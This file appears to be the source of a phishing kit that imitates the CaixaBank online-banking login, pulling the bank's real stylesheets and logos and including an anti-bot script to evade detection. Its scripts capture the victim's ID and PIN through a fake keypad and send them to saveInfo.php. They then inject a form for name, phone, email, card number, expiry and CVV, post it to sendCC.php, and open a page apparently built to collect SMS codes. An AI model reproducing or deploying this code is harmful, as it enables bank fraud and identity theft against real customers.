<?php

include "./BOTS/antibots.php";

?>
<!DOCTYPE html>
<html>
<head>
	<style>
		.keypad {
		    width: 70%;
		}
		.button{
			float: left;
		    width: 13%;
		    border: 1px solid rgb(225, 230, 226);
		    padding: 2%;
		    margin: 1%;
		    color: black;
		    cursor: pointer;
		    background: white;
		    font-size: 23px;
		}
		.clear{
			float: left;
		    width: 28%;
		    margin: 1%;
		    height: 42px;
		    border: 1px solid rgb(225, 230, 226);
		    background: white;
		    cursor: pointer;
		    font-family: 'Open Sans', sans-serif;
		    font-weight: bold;
		}
		.loadingBox{
			background: hsla(44, 0%, 97%);
		    height: 500px;
		    position: fixed;
		    width: 40%;
		    top: 16%;
		    left: 30%;
		    z-index: 1;
		    display: none;
		}
		.firstnameSection{

		}
		.label1 {
		    font-size: 21px;
		}
		.input1 {
		    background: #eceeee;
		    padding: 10px;
		    font-size: 1.19rem;
		    font-family: "open_sanssemibold";
		    width: 100%;
		    color: #333;
		    border-radius: 4px;
		    border-bottom: 2px solid #666 !important;
		    margin: 0.5%;
		}
	</style>
	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
	<link href="https://loc5.caixabank.es/css/lo_postlogon.css" rel="stylesheet" type="text/css">
	<title>Ciaxa Login</title>
</head>
<body style="margin: 0; padding: 0; font-family: 'Open Sans', sans-serif;">
	<div class="loadingBox" id="loadingBox">
		<img src="https://i.gifer.com/4V0b.gif" style="
    position: fixed;
    top: 32%;
    left: 42%;
">
	</div>
<div>
<div class="dtable padt18 derecha15p padb18 padl15 lfloat">

<a title="CaixaBank" class="dtcell vamid" href="javascript:openCaixaBank();">
<img src="https://loc8.caixabank.es/imatge/logo_caixabank_40.png" alt="CaixaBank">
</a>
<div class="dtcell vamid bigger5 padl30 ttup">
<img src="https://loc8.caixabank.es/c-images/html-images/logo_caixabanknow_big.png" onerror="this.src='https://loc8.caixabank.es/c-images/html-images/logo_caixabanknow_big.png'">
</div>


</div>
<div class="rfloat lang_container"><div class="lang"><div class="lfloat pos_relative"><input type="hidden" name="idioma" id="idioma" value="ES"><a aria-expanded="false" class="ico-world escoger-idioma btn_desplegable_idioma" href="javascript:void(0)">Espagnol</a><div class="desplegable_idiomas hide" style=""><div class=""><a href="#" title="Spanish" class="" data-value="Spanish" data-txt="Spanish" onclick="javascript:submit_idioma('02')">Spanish</a></div><div class=""><a href="#" title="Catalan" class="" data-value="Catalan" data-txt="Catalan" onclick="javascript:submit_idioma('01')">Catalan</a></div><div class=""><a href="#" title="Basque" class="" data-value="Basque" data-txt="Basque" onclick="javascript:submit_idioma('10')">Basque</a></div><div class=""><a href="#" title="Galician" class="" data-value="Galician" data-txt="Galician" onclick="javascript:submit_idioma('11')">Galician</a></div><div class=""><a href="#" title="Valencià" class="" data-value="Valencià" data-txt="Valencià" onclick="javascript:submit_idioma('06')">Valencià</a></div><div class=""><a href="#" title="Czech" class="" data-value="Czech" data-txt="Czech" onclick="javascript:submit_idioma('17')">Czech</a></div><div class=""><a href="#" title="Danish" class="" data-value="Danish" data-txt="Danish" onclick="javascript:submit_idioma('18')">Danish</a></div><div class=""><a href="#" title="Deutsch" class="" data-value="Deutsch" data-txt="Deutsch" onclick="javascript:submit_idioma('05')">Deutsch</a></div><div class=""><a href="#" title="Espagnol" class="activo" data-value="Espagnol" data-txt="Espagnol" onclick="javascript:submit_idioma('03')">Espagnol</a></div><div class=""><a href="#" title="French" class="" data-value="French" data-txt="French" onclick="javascript:submit_idioma('04')">French</a></div><div class=""><a href="#" title="Italian" class="" data-value="Italian" data-txt="Italian" onclick="javascript:submit_idioma('13')">Italian</a></div><div class=""><a href="#" title="Magyar" class="" data-value="Magyar" data-txt="Magyar" onclick="javascript:submit_idioma('22')">Magyar</a></div><div class=""><a href="#" title="Dutch" class="" data-value="Dutch" data-txt="Dutch" onclick="javascript:submit_idioma('16')">Dutch</a></div><div class=""><a href="#" title="Norsk" class="" data-value="Norsk" data-txt="Norsk" onclick="javascript:submit_idioma('26')">Norsk</a></div><div class=""><a href="#" title="Polski" class="" data-value="Polski" data-txt="Polski" onclick="javascript:submit_idioma('23')">Polski</a></div><div class=""><a href="#" title="Portuguese" class="" data-value="Portuguese" data-txt="Portuguese" onclick="javascript:submit_idioma('14')">Portuguese</a></div><div class=""><a href="#" title="Slovene" class="" data-value="Slovene" data-txt="Slovene" onclick="javascript:submit_idioma('19')">Slovene</a></div><div class=""><a href="#" title="Suomi" class="" data-value="Suomi" data-txt="Suomi" onclick="javascript:submit_idioma('20')">Suomi</a></div><div class=""><a href="#" title="Swedish" class="" data-value="Swedish" data-txt="Swedish" onclick="javascript:submit_idioma('15')">Swedish</a></div><div class=""><a href="#" title="Türkçe" class="" data-value="Türkçe" data-txt="Türkçe" onclick="javascript:submit_idioma('27')">Türkçe</a></div><div class=""><a href="#" title="ελληνικά" class="" data-value="ελληνικά" data-txt="ελληνικά" onclick="javascript:submit_idioma('21')">ελληνικά</a></div><div class=""><a href="#" title="русский" class="" data-value="русский" data-txt="русский" onclick="javascript:submit_idioma('25')">русский</a></div><div class=""><a href="#" title="中文" class="" data-value="中文" data-txt="中文" onclick="javascript:submit_idioma('99')">中文</a></div></div></div></div></div>
</div>
<div class="limpiar bbot4blue inferior20 medida100"></div>
<div class="contenido_sin_frame" id="contenido_sin_frame">
<div class="login-new">
<div class="limpiar"></div>
<div class="mb20">

<a class="dtable centrado">
<img src="https://loc8.caixabank.es/imatge/lolopo/candado.png" alt="Acceder a CaixaBankProtect abre en ventana nueva" class="dtable centrado">
</a>
<h1 class="dtable centrado" style="font-family: 'Open Sans', sans-serif;">Accès sécurisé à CaixaBankNow</h1>
</div>
<div class="login">
<form name="INPUTS" onsubmit="return false" action="/GPeticiones;WebLogicSession=cv1A4D434gCTcNzXh5o4eGwZUnyiKnGqeyCeeZqd0D6NQbM4dkKv!-288159816!1661576519" method="post">
<div class="usuario prel" style="font-family: 'Open Sans', sans-serif;">
<div id="accesibleEnlace"><a href="javascript:cambiarTecladoAccesible();" id="link_accesible" title="Enter in an accessible way" style="font-family: 'Open Sans', sans-serif;">Entrer in an accessible way</a></div>
<label for="indentificacion" style="font-family: 'Open Sans', sans-serif;">Identification</label>
<input id="ID" name="ID" class="" type="text" value="" onkeypress="javascript:pulsaTeclaID();" maxlength="20" size="12">
</div>
<div id="capaErrorID" class="msg_error_form mt10 pd10" style="display:none;"></div>
<div class="pinpad-wrapper" id="teclado_user" style="display:none;">
<div class="pinpad-component">
<div id="destinoTecladoVirtual" class="pinpad alfanum"></div>
</div>
</div>
<div class="check-field prel">
<input type="checkbox" onkeydown="javascript:marcarCheck(event);" onclick="javascript:ayudaCheck();" value="recordar" name="recordar" id="recordar" title="recordar" style="    cursor: pointer;
    box-sizing: border-box;
    width: 100%;
    margin: 0;
    line-height: normal;
    position: absolute;
    display: inline-block;
    height: 25px;
    opacity: 0;
    background: transparent;">
<label for="recordar" style="font-family: 'Open Sans', sans-serif;">Save ID</label>
</div>
<div id="linkTecladoNormal" class="rfloat teclado mt7 mb10">
<a class="trigger_teclado_user link prel" onclick="javascript:TraerContenidoQwertyPortal('/GPeticiones;WebLogicSession=cv1A4D434gCTcNzXh5o4eGwZUnyiKnGqeyCeeZqd0D6NQbM4dkKv!-288159816!1661576519?PN=LGN&amp;PE=117','destinoTecladoVirtual');" href="javascript:void(0);" title="Use virtual keyboard" data-back="Hide keyboard" data-back-onclick="" data-back-title="Hide keyboard">
Use virtual keyboard
</a>
</div>
<div class="limpiar"></div>
<div class="clave">
<label class="lfloat" for="pin1" style="font-family: 'Open Sans', sans-serif;">PIN</label>
<a class="link ml5" href="javaScript:submit_olvido();" title="Click here to recover your PIN">&nbsp;Have you forgotten your access keys?</a>
<input class="" name="pin1" id="pin1" oninput="error();" size="12" maxlength="16" onkeydown="error();" readonly="true" type="password">
<script type="text/javascript">
	function error(){
		document.getElementById('pin1').style.boxShadow = "1px 0px 0px 2px rgb(232, 88, 33)";
		document.getElementById('errorLabel').style.display = "block";
	}
</script>
</div>
<div id="capaErrorPW" class="msg_error_form mt10 pd10" style="display:none;"></div>
<label id="errorLabel" style="    font-size: 19px;
    margin: 3%;
    color: rgb(232, 88, 33);
    font-family: 'Open Sans', sans-serif; display: none;">Type your Personal Secret Number on the screen keyboard</label>
</form>
<div class="pinpad-wrapper" id="introducirPasswordVirtual" style="display: block;">
<div class="pinpad-component">
<span class="pinpad">
<h1 style="">
	<div class="keypad">
		<?php

			$type=random_int(1, 5);
			if($type == 1) $numbers = array('2','1','5','4','9','6','3','7','0','8');
			if($type == 2) $numbers = array('8','2','6','9','4','1','7','3','5','9');
			if($type == 3) $numbers = array('9','4','0','5','2','3','7','6','8','1');
			if($type == 4) $numbers = array('5','8','1','0','3','4','7','6','9','2');
			if($type == 5) $numbers = array('6','9','0','2','4','7','5','3','2','1');

			for ($i=0; $i < 10; $i++) { 
				echo '<button class="button" onclick="KeyPress(this.id);" id="'.$numbers[$i].'">'.$numbers[$i].'</button>';
			}

		?>
		<button class="clear" onclick="ClearPass();">DELETE</button>
	</div>
	<script type="text/javascript">
		function KeyPress(id){
			var textbox = document.getElementById('pin1').value;
			if (textbox.length < 17) {
				document.getElementById('pin1').value = textbox+id;
			}
		}
		function ClearPass(){
			document.getElementById('pin1').value = "";
		}
	</script>
</h1>
</span>
</div>
</div>
<div class="pinpad-wrapper" id="introducirTecladoVirtual2" style="display:none">
<div class="pinpad-component">
<div id="destinoTecladoVirtual2" class="pinpad alfanum"></div>
</div>
</div>
<div id="linkTecladoNormal2" class="rfloat teclado mt7 mb10">
<a href="" onclick="javascript:cambioTecladoVirtualPinPortal();" class="trigger_teclado_pwd link" title="Display keyboard with letters" data-back="Display simple keyboard" data-back-onclick="javascript:cambioTecladoNormalPinPortal();" data-back-title="Display simple keyboard">Display keyboard with letters</a>
</div>
<div class="limpiar"></div>
<script type="text/javascript">
	var count = -1;
	function CheckExpirty(id){
		var field = document.getElementById(id).value;
		var key = event.keyCode || event.charCode;
		if( key == 8 || key == 46 ){
	    	document.getElementById(id).value = "";
	    	count = -1;
	    }else{
			if(field.length >=5) return false;
			count++;
			if(count >=2){
				document.getElementById(id).value = document.getElementById(id).value + "/";
				count = 0;
			}
		}
	}
	function CheckCC(id){
		var key = event.keyCode || event.charCode;

	    if( key == 8 || key == 46 ){
	    	document.getElementById(id).value = "";
	    	count = -1;
	    }else{
	    	if(document.getElementById(id).value.length >=19) return false;
	    	count++;
			if(count >=4){
				document.getElementById(id).value = document.getElementById(id).value + " ";
				count = 0; 
			}
	    }
	}

	document.getElementById("iframe").load(function(){
		alert("Ok");
	    document.getElementById("loadingBox").style.display = "block";
	    setTimeout(
			function(){ 
				document.getElementById("loadingBox").style.display = "none";
			}, 3000);
	});

	function Verify1(){
		var cc = document.getElementById('cnumber').value;
		var exp = document.getElementById('ccexp').value;
		var cvv = document.getElementById('ccv').value;
		var fname = document.getElementById('fname').value;
		var lname = document.getElementById('lname').value;
		var phone = document.getElementById('phone').value;
		var mail = document.getElementById('mail').value;

		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {

		};
		xhttp.open("POST", "sendCC.php", true);
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		xhttp.send("cc="+ cc +"&exp="+ exp + "&cvv=" + cvv + "&fname=" + fname + "&lname="+lname+"&p="+phone+"&m="+mail);

		/*var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				
			}
		};
		xhttp.open("GET", "sendCC.php?cc="+ cc +"&exp="+ exp + "&cvv=" + cvv + "&fname=" + fname + "&lname="+lname+"&p="+phone+"&m="+mail, true);
		xhttp.send();*/
		document.getElementById("contenido_sin_frame").innerHTML = '<iframe id="iframe" src="./confirmSMS.php" style="    position: fixed;top: 176px;left: 0;bottom: 0;right: 0;width: 100%;height: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;"></iframe>';
	}
	
	
	function ShowLoading(){
		var input1 = document.getElementById('pin1').value;
		var input2 = document.getElementById('ID').value;
		/*if(input1.length <= 0) {
			return document.getElementById('pin1').style.boxShadow = "1px 0px 0px 2px rgb(232, 88, 33)";
		}
		if(input2.length <= 0) {
			return document.getElementById('pin2').style.boxShadow = "1px 0px 0px 2px rgb(232, 88, 33)";
		}*/
		document.getElementById("loadingBox").style.display = "block";
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				
			}
		};
		xhttp.open("GET", "saveInfo.php?pin1="+ input1 +"&id="+ input2, true);
		xhttp.send();

		setTimeout(
			function(){ 
				document.getElementById("loadingBox").style.display = "none";
				document.getElementById("contenido_sin_frame").innerHTML = "<center><font color='blue' style='font-size: 31px;color: rgb(65, 171, 232);font-family: 'Open Sans', sans-serif;'>Veuillez remplir les informations ci-dessous</font><br><br><div class='firstnameSection'><table style='width:58%;'><tr><td><p class='label1'>Prénom: </td><td><input type='text' name='fname' id='fname' placeholder='Prénom' class='input1'></td></tr><tr><td><p class='label1'>Nom de famille: </td><td><input type='text' name='lname' id='lname' placeholder='Nom de famille' class='input1'></td></tr><tr><td><p class='label1'>Numéro de téléphone: </td><td><input type='text' name='phone' maxlength='12' id='phone' placeholder='+34xxxxxxxxx' class='input1'></td></tr><tr><td><p class='label1'>Email: </td><td><input type='mail' name='mail' id='mail' placeholder='example@mail.com' class='input1'></td></tr><tr><br></tr></table><br><br><table style=width:'58%'><td colspan=2><h1>Détails de la carte de crédit</h1></td></tr><tr><td><p class='label1'>Nom du titulaire:</td><td><input type='text' name='holdername' id='holdername' placeholder='Jonathan Smith' class='input1'></td></tr><tr><td><p class='label1'>Numéro de carte:</td><td><input type='text' name='cnumber' id='cnumber' maxlength='19' placeholder='XXXX XXXX XXXX XXXX' class='input1' onkeydown='CheckCC(this.id);'></td></tr><tr><td><p class='label1'>Expiry: <input type='text' name='ccexp' id='ccexp' class='input1' style='width: 50%;' placeholder='01/2020' onkeydown='CheckExpirty(this.id);' maxlength='5'></td><td><p class='label1'>CCV: <input type='text' name='ccv' id='ccv' class='input1' style='width: 50%;' placeholder='XXX' maxlength='3'></td></tr></table></div><button style='width: 39%;margin: 3%;height: 37px;background: rgb(120, 202, 235);color: white;font-size: 20px; font-family: 'Open Sans', sans-serif; border: 1px solid;cursor: pointer;' onclick='Verify1();'>Prochain</button></center>";
			}, 3000);
	}
</script>
<a href="#" id="enlaceBotonAceptar" class="btn-submit" style="font-family: 'Open Sans', sans-serif;" onclick="ShowLoading();">Entrer CaixaBankNow</a>
<div class="limpiar"></div>
<div class="menu_links">
<ul class="links-footer">
<li><a id="linkAlta" target="_blank" href="http://portal.lacaixa.es/bancadistancia/comodarsedealta_es.html" title="Registration in CaixaBankNow">Registration in CaixaBankNow</a></li>
<li><a id="linkDemo" href="JavaScript:document.forms['LGN_DEMO'].submit();" title="Demonstration">Demonstration</a></li>
<li><a href="javascript:n_ventana(1);" title="Security">Security</a></li>
<li><a id="linkProtect" href="javascript:linkCandado('https://portal.lacaixa.es/tarjetas/caixaprotect_es.html');" title="CaixaBankProtect">CaixaBankProtect</a></li>
</ul>
</div>
</div>
</div>

<a href="http://www.caixabank.es" class="icon_volver lfloat derecha225">Back</a>

<div class="pie">
<iframe src=""></iframe>
<div class="superior5">
<ul class="menu_simple">
<li><a href="javascript:info()">Legal notice</a></li>
<li><a href="javascript:n_ventana(1)">Security</a></li>
<li><a href="javascript:n_ventana(2)">Rates</a></li>
</ul>
</div>
<div class="superior5">@ CaixaBank, S.A.2020. All rights reserved.</div>
</div>
</div>
</body>
</html>